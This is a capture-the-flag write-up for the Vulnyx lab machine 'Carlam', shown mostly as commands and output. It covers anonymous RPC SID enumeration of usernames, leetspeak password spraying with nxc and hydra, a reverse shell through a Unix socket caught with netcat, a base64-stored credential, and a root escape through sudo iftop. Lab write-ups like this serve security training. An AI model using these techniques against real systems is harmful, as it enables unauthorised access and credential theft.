# Vulnyx: Carlam

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `Micky` |
| **Tools used** | `nmap` · `showmount` · `nxc` · `smbclient` · `smbmap` · `rpcclient` · `hydra` · `socat` · `nc` |
| **Tags** | `#RPCEnumeration` `#PasswordMutation` `#UnixSocket` `#CredentialLeak` `#SudoAbuse` |
| **URL** | https://vulnyx.com/machines/ |

RPC's SID-to-username lookup, done without any credentials, leaks a set of real usernames. A small custom wordlist — each name run through a "leetspeak" character substitution — cracks SSH for one of them. From there, a Unix socket in `/tmp` accepts a `create_reverse_shell` command that spawns a shell as a different, more privileged user, exposing a base64-encoded credential for a third account. That account's `sudo` access to `iftop` is enough to escalate to root through its interactive command prompt.

## Enumeration
### Port Enumeration
A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn carlam.nyx

PORT      STATE  SERVICE       REASON
22/tcp    open   ssh           syn-ack ttl 64
111/tcp   open   rpcbind       syn-ack ttl 64
139/tcp   open   netbios-ssn   syn-ack ttl 64
445/tcp   open   microsoft-ds  syn-ack ttl 64
2049/tcp  open   nfs           syn-ack ttl 64
39829/tcp open   unknown       syn-ack ttl 64
40341/tcp open   unknown       syn-ack ttl 64
44475/tcp open   unknown       syn-ack ttl 64
45449/tcp open   unknown       syn-ack ttl 64
48847/tcp open   unknown       syn-ack ttl 64
MAC Address: 08:00:27:25:A7:35 (Oracle VirtualBox virtual NIC)
```

Several ports come back: **22 (SSH)**, **111 (rpcbind)**, **139/445 (SMB)**, **2049 (NFS)**, and a handful of high, dynamically-assigned RPC ports typical of NFS/mountd. A version and script scan on those ports fills in the details:

```bash
$ sudo nmap -p 22,111,139,445,2049,39829,40341,44475,45449,48847 -sCV carlam.nyx

PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 48:a5:6a:7a:bf:c3:8a:60:be:f8:0d:4f:44:bd:2f:e4 (RSA)
|   256 e5:6c:a7:94:25:09:75:2d:d0:55:78:b8:d6:c3:26:f2 (ECDSA)
|_  256 36:a2:cc:18:ff:01:62:e0:be:df:dc:35:3a:b9:e9:ee (ED25519)
111/tcp   open   rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100003  3,4          2049/tcp   nfs
|_  100003  3,4          2049/tcp6  nfs
139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: FINE_ARTS)
445/tcp   open   netbios-ssn Samba smbd 4.8.12 (workgroup: FINE_ARTS)
2049/tcp  open   nfs         3-4 (RPC #100003)
39829/tcp open   status      1 (RPC #100024)
40341/tcp open   mountd      1-3 (RPC #100005)
44475/tcp open   nlockmgr    1-4 (RPC #100021)
45449/tcp open   mountd      1-3 (RPC #100005)
48847/tcp open   mountd      1-3 (RPC #100005)
MAC Address: 08:00:27:25:A7:35 (Oracle VirtualBox virtual NIC)
Service Info: Host: CARLAM

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: CARLAM, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2026-08-03T13:56:43
|_  start_date: N/A
|_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: 0s
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.8.12)
|   Computer name: carlam
|   NetBIOS computer name: CARLAM\x00
|   Domain name: my.domain
|   FQDN: carlam.my.domain
|_  System time: 2026-08-03T15:56:43+02:00
```

### NFS Enumeration

`showmount` lists two exports:

```bash
$ showmount -e carlam.nyx
Export list for carlam.nyx:
/tmp/carlam *
/srv/share  *
```

`/tmp/carlam` leads nowhere, so `/srv/share` is the export worth mounting and exploring:

```bash
$ sudo mount -t nfs carlam.nyx:/srv/share ~/Vulnyx/Easy/Carlam/NFS/ -o nolock
```

```bash
$ ls -la NFS
total 380
drwxrwxrwx 2 root root   4096 May  5  2025 .
drwxrwxr-x 3 kali kali   4096 Aug  3 10:20 ..
-rw-rw-r-- 1 kali kali 372208 May  5  2025 carlampio.jpg
-rw-rw-r-- 1 kali kali    542 May  5  2025 microrelato.txt
-rw-r--r-- 1 kali kali     74 May  5  2025 .notes

$ cat NFS/.notes
Upgrade packages
Remove unused applications
Not use Leet
Remove old users
```

```bash
$ cat NFS/microrelato.txt
Con ese amargor tan extraño, que primero le acompañó en las fiestas de guardar. Después, amargo, que hizo hermano de linaje, para los fines de semana; y casi sin darse cuenta amargor dulzón de entre semana, que los días se hacen muy largos... Pero más agrio fue el día que entró en el juzgado para defender al pobre camello. Acre, como la condena por atentado contra la salud pública. Y más bien agridulce el sabor con la garganta amarga para argumentar tristemente, entre sus dientes dormidos:
- La sociedad es la culpable, señoría-.
```

The `.notes` file stands out — "Not use Leet" reads like a self-reminder from an admin who does exactly that. That hint drives the password strategy later.

### SMB Enumeration

```bash
$ nxc smb carlam.nyx
SMB         carlam.nyx      445    CARLAM           [*] Unix - Samba (name:CARLAM) (domain:my.domain) (signing:False) (SMBv1:True) (Null Auth:True)

$ nxc smb carlam.nyx -u '' -p ''
SMB         carlam.nyx      445    CARLAM           [*] Unix - Samba (name:CARLAM) (domain:my.domain) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         carlam.nyx      445    CARLAM           [+] my.domain\:
```

```bash
$ smbclient -N -L //carlam.nyx

        Sharename       Type      Comment
        ---------       ----      -------
        share           Disk
        IPC$            IPC       IPC Service (CARLAM MV Vulnerable Server)

Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        FINE_ARTS            CARLAM
```

```bash
$ smbmap -H carlam.nyx

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)

[+] IP: carlam.nyx:445  Name: carlam.nyx            Status: NULL Session
    Disk                                                  Permissions     Comment
    ----                                                  -----------     -------
    share                                                 NO ACCESS
    IPC$                                                  NO ACCESS       IPC Service (CARLAM MV Vulnerable Server)
[*] Closed 1 connections
```

The null session connects, but every share reads as `NO ACCESS` — no files come out this way. RPC is the next thing to try over the same anonymous access.

### RPC User Enumeration

A null RPC session enumerates valid usernames by brute-forcing local SIDs — starting from `root`'s own SID to establish the domain/machine prefix, then walking a range of RIDs:

```bash
$ rpcclient -W '' -U ''%'' carlam.nyx -c 'lookupnames root'
root S-1-22-1-0 (User: 1)
```

The `S-1-22-1` prefix is Samba's "Unix User" SID domain — the one `winbind` uses to map local Unix UIDs onto Windows-style SIDs — and under that scheme the RID is simply the UID. That makes the brute force trivial: walking RIDs is the same as walking UIDs, and 1000 is the default first UID for regular (non-system) accounts on most Linux distributions, so the sweep starts there:

```bash
$ for i in $(seq 1000 1005); do
  bash -c "rpcclient -W '' -U ''%'' carlam.nyx -c 'lookupsids S-1-22-1-$i'"
done
S-1-22-1-1000 Unix User\carlampio (1)
S-1-22-1-1001 Unix User\xiroi (1)
S-1-22-1-1002 Unix User\aitana (1)
S-1-22-1-1003 Unix User\1003 (1)
S-1-22-1-1004 Unix User\1004 (1)
S-1-22-1-1005 Unix User\1005 (1)
```

RIDs 1000–1002 resolve to real names; from 1003 on they come back unmapped, so the account list stops there.

> **Users:** `carlampio`, `xiroi`, `aitana`

## Initial Access

### Password Mutation & Spraying

Rather than reach for a generic wordlist, each recovered name goes through a simple leetspeak substitution (`a→4`, `e→3`, `i→1`, `o→0`, `s→5`, `t→7`), in both its capitalized and lowercase forms — a choice prompted by the NFS `.notes` file seen earlier: "Not use Leet" only makes sense as a self-reminder if leetspeak is in fact how this admin builds passwords.

```bash
$ echo 'Carlampio' | sed 's/a/4/g; s/e/3/g; s/i/1/g; s/o/0/g; s/s/5/g; s/t/7/g' > passwords.txt
$ echo 'carlampio' | sed 's/a/4/g; s/e/3/g; s/i/1/g; s/o/0/g; s/s/5/g; s/t/7/g' >> passwords.txt
$ echo 'Xiroi' | sed 's/a/4/g; s/e/3/g; s/i/1/g; s/o/0/g; s/s/5/g; s/t/7/g' >> passwords.txt
$ echo 'xiroi' | sed 's/a/4/g; s/e/3/g; s/i/1/g; s/o/0/g; s/s/5/g; s/t/7/g' >> passwords.txt
$ echo 'Aitana' | sed 's/a/4/g; s/e/3/g; s/i/1/g; s/o/0/g; s/s/5/g; s/t/7/g' >> passwords.txt
$ echo 'aitana' | sed 's/a/4/g; s/e/3/g; s/i/1/g; s/o/0/g; s/s/5/g; s/t/7/g' >> passwords.txt
```

```bash
$ printf 'carlampio\nxiroi\naitana\n' > users.txt
```

Spraying that name/password pair set over SMB returns one hit:

```bash
$ nxc smb carlam.nyx -u users.txt -p passwords.txt
SMB         carlam.nyx      445    CARLAM           [*] Unix - Samba (name:CARLAM) (domain:my.domain) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         carlam.nyx      445    CARLAM           [+] my.domain\carlampio:C4rl4mp10 (Guest)
```

### Shell as carlampio

The same credential is worth testing against SSH, since password reuse across services is the norm on a box like this:

```bash
$ hydra -l 'carlampio' -p 'C4rl4mp10' ssh://carlam.nyx

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://carlam.nyx:22/
[22][ssh] host: carlam.nyx   login: carlampio   password: C4rl4mp10
1 of 1 target successfully completed, 1 valid password found
```

```bash
$ ssh carlampio@carlam.nyx
carlampio@carlam.nyx's password:
Welcome to CARLAM!
VM Vulnerable to improve your hacking skills
by Micky
carlam:~$ id
uid=1000(carlampio) gid=1000(carlampio) groups=1000(carlampio)
carlam:~$ ls -l /home/carlampio/
total 4
-rw-r--r--   1 root     carlampi        33 May  5  2025 user.txt
carlam:~$ cat /home/carlampio/user.txt
23bdb9bfae27f13a9e216fa72fcdf9c5
```

> **User flag:** `23bdb9bfae27f13a9e216fa72fcdf9c5`

## Lateral Movement

### Loot: A Unix Socket in /tmp

`/tmp` holds a single, unexpected item — a Unix domain socket owned by `xiroi`:

```bash
carlam:/tmp$ ls -l /tmp
total 0
srwxrwxrwx   1 xiroi    xiroi            0 Aug  3 15:55 app.sock
carlam:/tmp$ file /tmp/app.sock
/tmp/app.sock: socket
```

A local application listens on that socket rather than on a network port. `socat` connects to it directly to see what it accepts:

```bash
carlam:/tmp$ socat -UNIX-CONNECT:/tmp/app.sock
2026/08/03 16:42:15 socat[2879] E exactly 2 addresses required (there are 0); use option "-h" for help
carlam:/tmp$ socat - UNIX-CONNECT:/tmp/app.sock
help
Commands:
  help              → Show this message
  whoami            → Show real user
  list              → List files in /home/xiroi
  create_reverse_shell  → Shell in 4444
carlam:/tmp$ echo -n 'create_reverse_shell' | socat - UNIX-CONNECT:/tmp/app.sock
[xiroi] Shell in 4444
```

The `create_reverse_shell` command fires a shell back to port 4444, so a second SSH session catches it on the box:

```bash
$ ssh carlampio@carlam.nyx
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
carlampio@carlam.nyx's password:
Welcome to CARLAM!
VM Vulnerable to improve your hacking skills
by Micky
carlam:~$ nc -nlvp 4444
listening on [::]:4444 ...
connect to [::ffff:127.0.0.1]:4444 from [::ffff:127.0.0.1]:40379 ([::ffff:127.0.0.1]:40379)
/bin/ash: can't access tty; job control turned off
/ $ id
uid=1001(xiroi) gid=1001(xiroi) groups=1001(xiroi)
```

The shell runs as `xiroi`, not `carlampio` — the socket handed over a more privileged user. That immediately opens up `xiroi`'s home directory:

```bash
/ $ ls -la /home/xiroi
total 40
drwxr-x---    5 xiroi    xiroi         4096 May  6 2025 .
drwxr-xr-x    5 root     root          4096 May  6 2025 ..
drwxr-xr-x    2 xiroi    xiroi         4096 May  6 2025 .apps
-rw-------    1 xiroi    xiroi           21 May  6 2025 .ash_history
drwxr-xr-x    2 xiroi    xiroi         4096 May  6 2025 .conf
drwx------    2 xiroi    xiroi         4096 May  6 2025 .ssh
-rwxr-xr-x    1 xiroi    xiroi        15600 May  6 2025 app
/ $ ls -la /home/xiroi/.apps
total 8
drwxr-xr-x    2 xiroi    xiroi         4096 May  6 2025 .
drwxr-x---    5 xiroi    xiroi         4096 May  6 2025 ..
-rw-r--r--    1 xiroi    xiroi            0 May  6 2025 none
/ $ ls -la /home/xiroi/.conf
total 20
drwxr-xr-x    2 xiroi    xiroi         4096 May  6 2025 .
drwxr-x---    5 xiroi    xiroi         4096 May  6 2025 ..
-rw-r--r--    1 xiroi    xiroi           13 May  6 2025 .hi
-rw-r--r--    1 xiroi    xiroi           33 May  6 2025 .scrt
-rw-r--r--    1 xiroi    xiroi           13 May  6 2025 sort
/ $ ls -la /home/xiroi/.ssh
total 8
drwx------    2 xiroi    xiroi         4096 May  6 2025 .
drwxr-x---    5 xiroi    xiroi         4096 May  6 2025 ..
/ $ cat /home/xiroi/.conf/.scrt
YWl0YW5hOjQxdDRuNfNfUzNjcjN0Cg==
```

Of everything in that listing, `app` is presumably the binary behind `app.sock` (no need to reverse it — the socket's own `create_reverse_shell` command already did the job), and `.hi` / `sort` inside `.conf` turn out to be unrelated leftovers. The interesting one is `.scrt`: its contents look like a base64 blob and decode directly:

```bash
$ echo "YWl0YW5hOjQxdDRuNfNfUzNjcjN0Cg==" | base64 -d
aitana:41t4n4S_S3cr3t
```

### Escalating to aitana

That decodes to a `user:password` pair for the third account. As before, the credential is tested against SSH:

```bash
$ hydra -l 'aitana' -p '41t4n4S_S3cr3t' ssh://carlam.nyx

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://carlam.nyx:22/
[22][ssh] host: carlam.nyx   login: aitana   password: 41t4n4S_S3cr3t
1 of 1 target successfully completed, 1 valid password found
```

```bash
$ ssh aitana@carlam.nyx
aitana@carlam.nyx's password:
Welcome to CARLAM!
VM Vulnerable to improve your hacking skills
by Micky
carlam:~$ id
uid=1002(aitana) gid=1002(aitana) groups=1002(aitana)
```

## Privilege Escalation

### Shell Escape in `iftop`

A quick `sudo -l` shows what `aitana` is allowed to run as root without a password:

```bash
carlam:~$ sudo -l
User aitana may run the following commands on carlam:
    (ALL) NOPASSWD: /usr/sbin/iftop
```

`iftop` is a network bandwidth monitor, but like several interactive terminal tools it accepts commands typed into its own interface — and one of them is enough to break out into a shell entirely:

```bash
carlam:~$ sudo /usr/sbin/iftop
```

Inside the running TUI, pressing `!` opens `iftop`'s own command line at the bottom of the screen; feeding it a shell path executes it with whatever privileges `iftop` itself has — root, in this case:

```
Command > /bin/ash
```

<img src="../Images/carlam/Pasted image 20260803165140.png"/>

```bash
carlam:/home/aitana# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
carlam:/home/aitana# ls -l /root
total 4
-rw-r--r--    1 root     root            33 May  5  2025 root.txt
carlam:/home/aitana# cat /root/root.txt
9755cbb374f1a6b47d52160a452b7084
```

> **Root flag:** `9755cbb374f1a6b47d52160a452b7084`

## Takeaways

- A null RPC session (`rpcclient -U ''%''`) can enumerate real usernames by brute-forcing SIDs even when no shares or files are directly readable — worth trying on any SMB target that allows anonymous connections at all.
- Small, target-specific wordlists (leetspeak variants of real names, in this case) often outperform generic ones, especially against systems where the same naming convention shows up in usernames and passwords alike.
- A Unix socket found on disk is worth interacting with directly — whatever protocol it speaks isn't restricted by network firewalling, and its exposed functionality (like a `create_reverse_shell` command here) can run with entirely different privileges than the user who found it.
- Any interactive terminal tool granted through `sudo` — `iftop` included — is worth checking for a command mode or shell-escape feature before assuming it's safe just because it isn't `bash`, `vim`, or another well-known GTFOBins entry.